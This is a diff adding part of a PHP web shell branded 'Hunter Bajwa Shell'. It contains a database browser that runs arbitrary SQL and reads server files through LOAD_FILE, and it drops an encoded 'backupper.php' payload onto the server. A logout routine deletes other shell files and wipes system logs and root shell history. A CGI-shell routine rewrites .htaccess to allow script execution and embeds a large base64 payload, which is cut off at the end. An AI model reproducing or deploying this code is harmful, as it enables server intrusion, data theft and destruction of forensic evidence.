+        </script>';
+    if(isset($db) && $db->link){
+        echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
+            if(!empty($_POST['sql_base'])){
+                $db->selectdb($_POST['sql_base']);
+                echo "<tr><td width=1 style='border-top:1px solid #a3e956;border-right:2px solid #a3e956;'><span>Tables:</span><br><br>";
+                $tbls_res = $db->listTables();
+                while($item = $db->fetch($tbls_res)) {
+                    list($key, $value) = each($item);
+                    $n = $db->fetch($db->query('SELECT COUNT(*) as n FROM '.$value.''));
+                    $value = htmlspecialchars($value);
+                    echo "<nobr><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a href=# onclick=\"st('".$value."')\">".$value."</a> (".$n['n'].")</nobr><br>";
+                }
+                echo "<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'></td><td style='border-top:1px solid #a3e956;'>";
+                if(@$_POST['p1'] == 'select') {
+                    $_POST['p1'] = 'query';
+                    $db->query('SELECT COUNT(*) as n FROM '.$_POST['p2'].'');
+                    $num = $db->fetch();
+                    $num = $num['n'];
+                    echo "<span>".$_POST['p2']."</span> ($num) ";
+                    for($i=0;$i<($num/30);$i++)
+                        if($i != (int)$_POST['p3'])
+                            echo "<a href='#' onclick='st(\"".$_POST['p2']."\", $i)'>",($i+1),"</a> ";
+                        else
+                            echo ($i+1)," ";
+                    if($_POST['type']=='pgsql')
+                        $_POST['p3'] = 'SELECT * FROM '.$_POST['p2'].' LIMIT 30 OFFSET '.($_POST['p3']*30);
+                    else
+                        $_POST['p3'] = 'SELECT * FROM `'.$_POST['p2'].'` LIMIT '.($_POST['p3']*30).',30';
+                    echo "<br><br>";
+                }
+                if((@$_POST['p1'] == 'query') && !empty($_POST['p3'])) {
+                    $db->query(@$_POST['p3']);
+                    if($db->res !== false) {
+                        $title = false;
+                        echo '<table width=100% cellspacing=0 cellpadding=2 class=main>';
+                        $line = 1;
+                        while($item = $db->fetch())    {
+                            if(!$title)    {
+                                echo '<tr>';
+                                foreach($item as $key => $value)
+                                    echo '<th>'.$key.'</th>';
+                                reset($item);
+                                $title=true;
+                                echo '</tr><tr>';
+                                $line = 2;
+                            }
+                            echo '<tr class="l'.$line.'">';
+                            $line = $line==1?2:1;
+                            foreach($item as $key => $value) {
+                                if($value == null)
+                                    echo '<td><i>null</i></td>';
+                                else
+                                    echo '<td>'.nl2br(htmlspecialchars($value)).'</td>';
+                            }
+                            echo '</tr>';
+                        }
+                        echo '</table>';
+                    } else {
+                        echo '<div><b>Error:</b> '.htmlspecialchars($db->error()).'</div>';
+                    }
+                }
+                echo "<br><textarea name='p3' style='background-color:black; color: white;width:100%;height:100px'>".@htmlspecialchars($_POST['p3'])."</textarea><br/><input type=submit value='Execute'>";
+                echo "</td></tr>";
+            }
+            echo "</table></form><br/><form onsubmit='document.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='>>'></form>";
+            if(@$_POST['p1'] == 'loadfile') {
+                $db->query("SELECT LOAD_FILE('".addslashes($_POST['p2'])."') as file");
+                $file = $db->fetch();
+                echo '<pre class=ml1>'.htmlspecialchars($file['file']).'</pre>';
+            }
+    }
+    echo '</div>';
+    printFooter();
+}
+ 
+ 
+function actionBackupper() {
+    printHeader();
+            $backupper = "rVXdTtswFL4uEu/gSVmTSpAWxsVEVMGmMXEHot0mxFDkOk7j4diZf4Ay8Qq72c3uuNkD8gizY6dNq1bjYqnUxN/5zjmfz4lPulQlE57NgFQziofd75obAKKbqeCaZbuIUy4OwYQaKPGLu4IonICcM7Wbw5LQ2SFAWkhy26CSPOBDsLc/eJ24iN2pSra3uiYZwkxhsViXWEGACigkVj79p/HH3berfsUb+3zJNfgCGYNgpKBQYFxg8N5I0xU4y+vVyGgDR8C69J2P8z+qimp7CwvBRSpwxYUibBoNesZ8tGDlXJQAIkU482LcPzAyC5557PxsNG7r61hXwiqtgJpVTRWlnpREeX8Gy7X4LaS6MVzqc4+2m/GSom9qWLsZg3kzQH+x4b7d8WqVOrlmdQ3AOzZgUUBYD/wwMDBXwM0uhyAMEw+QPGroKb4nUskoxPcYhb2Fk72OLWhj7dgQvaRl8jGPv3HCIqfxK3P3ZfIjphKvS1hBKVUh9GpSPkmlfVGipXzHDb3e2holxm2KVYoohiz6d3Y5kwqXL8ztyP8rc4EpTdeV28dbEJYyNgGJNIdBci0QjoLc9qDiFa5bvuMaINyttz58+4y0d2PeVoqjV8c55rkJ3Ou1bHP3eAhygWFmCDt7g/2DpXpUiHJpRS00+7vASgtWh7AmA5t/kgOzGTNDoiC1x/MqdMcsvPbCO4G0k2EIgnR0cvH55OIqPB2Pz9NTQw6vk5pRQVUYhmkAustc9TsBlJktTG2Mw37oUArtb1O4OIwfSOWpiJclZNm8WigDcZwYO6j0hBKUFqqkSXnbXlp3T49r4bFfGNxSG5OT4Y1z1Er2mM3WTkPlOtaigZ3AvA+a2t66s+/Vu2JgVHAQ1uP4wA6ND5xh8Pz059fz0++fbuTWuH2c1EM+XPGDwByJ6XzUp2ZOsZvNU0/gbMPM8z6FwPkw9JsJm9yNujtGOcxWhPXhXNjj0vDvr36b+vbLaJd/AQ==";
+            $back = @fopen("backupper.php", "w");
+            @fwrite($back, htmlspecialchars_decode(gzinflate(base64_decode($backupper))));
+            @fclose($back);
+        ?>
+        <center>
+        <h1>Site Backupper By Hunter Bajwa</h1><br>
+        <iframe src="backupper.php" height="300" width="100%"></iframe>
+ 
+        <?php
+ 
+    printFooter();
+}
+ 
+function actionLogout() {
+    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
+    $hardfucker = "rm -rv locales.php;rm -rv cgi.php;rm -rv dirty;rm -rv exploit;rm -rv kill;rm -rv c0w;rm -rv article.php;rm -rv an0n.php;rm -rv anonghosts.php;rm -rv anonghost.php;rm -rv wso.php;rm -rv umar.php;rm -rv ninja.php;rm -rv rev.php;rm -rv umar.txt;rm -rv ak.php;rm -rv symlinker.php;rm -rv trjnx;rm -rv sym.pl;rm -rv symlinker.pl;rm -rv back_connecter.php;rm -rv fuck.php;rm -rv an.php;rm -rv file.php;rm -rv sym.php;rm -rv symlink.php;rm -rv trjnx;rm -rv data.txt;rm -rv fuck.txt;rm -rv dir.txt;rm -rv dmn.txt;rm -rv lala.php;rm -rv test.php;rm -rv data.php;rm -rv fucker.php;rm -rv symlinker.php;rm -rv madleets.php;rm -rv dirdefacer.php;rm -rv dirdeface.php;rm -rv shitchanger.php;rm -rv locales.php;rm -rv data.php;rm -rv db.php;rm -rv deleter.php; rm -rv dhanush.php;rm -rv anonghosts.php;rm -rv blackhat.php;rm -rv image.php;rm -rv madspot.php;rm -rv pcd.php;rm -rv cheta.php;rm -rv b374k.php;rm -rv joker.php;rm -rv zone-h.php;rm -rv rooter.pl;rm -rv cp.php;rm -rv works.php;rm -rv lala.php;rm -rv lalala.php;rm -rv testing.php; rm -rv madleets.php;rm -rv anoncmd.php;rm -rv mass.php;rm -rv backupper.php;rm -rf /var/log/lastlog;rm -rf /var/log/wtmp;rm -rf /etc/wtmp;rm -rf /var/run/utmp;rm -rf /etc/utmp;rm -rf /var/log;rm -rf /var/logs;rm -rf /var/adm;rm -rf /var/apache/log;rm -rf /var/apache/logs;rm -rf /usr/local/apache/log;rm -rf /usr/local/apache/logs;rm -rf /root/.bash_history;rm -rf /root/.ksh_history;rm -rv xcp.php;rm -rv cp.php;rm -rv md5.php;rm -rv UeXploiT;rm -rv AkDk";
+    $An0n_3xPloiTeR_Every_Where_vvv = ex($hardfucker);
+    die('<!DOCTYPE html>
+<html>
+    <head>
+        <title>Hunter Bajwa Shell</title>
+        <meta charset="UTF-8">
+        <meta http-equiv="refresh" content=""> <!-- For Refreshing after ____ interval of time -->
+        <meta name="description" content="Sites description">
+        <meta name="about" content="Made By Hunter Bajwa">
+        <meta name="description" content="Bye Bye">
+        <style>
+            .body {
+                margin-top: 7vh;
+                text-transform: capitalize;            
+                background-color: #080510;
+            }
+            .font {
+                font-family: calibri;
+                font-size: 300%;
+                text-align: center;
+                color: white;
+            }
+            .upass {
+                margin-top: 70vh;
+                font-family: calibri;
+                font-size: 100%;
+                text-align: center;
+                color: black;
+            }
+            textarea {
+                color: white;
+                font-weight: bold;
+                font-family: cursive;
+                border-left: black;
+                border-right: black;
+                border-style: groove;
+                background-color: black;
+                font-size: 80%;
+            }
+        </style>
+        <script language="JavaScript1.2">
+            function ejs_nodroit(){
+                alert("Login Please!");
+                return(false);
+            }
+            document.oncontextmenu = ejs_nodroit;
+        </script>
+    </head>
+ 
+    <body class="body">
+        <div class="font">
+            <font>you are going 😒😐<br>bye 😣😖😌😰<br><br></font><font style="color: red; font-family: cursive; font-size: 70%;">Take a Gift 😉🤓<br></font><br>
+        </div><center>
+        <textarea rows="10" cols="90">
+        '.$An0n_3xPloiTeR_Every_Where_vvv.'</textarea>
+    </body></center>
+</html>');
+}
+ 
+ 
+function actionCgiShell() {
+printHeader();
+    echo '<h1>Cgitelnet</h1><div class=content><br><center>Password: umar</center><br>';
+    $kokdosya = ".htaccess";
+    mkdir('An0ncgi', 0755);
+    chdir('An0ncgi');
+    $dosya_adi = "$kokdosya";
+    $dosya = fopen($dosya_adi, 'w') or die("Dosya açılamadı!");
+    $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI
+    AddType application/x-httpd-cgi .cin
+    AddHandler cgi-script .cin
+    AddHandler cgi-script .cin";
+        fwrite($dosya, $metin);
+        fclose($dosya);
+        $cgishellizocin = '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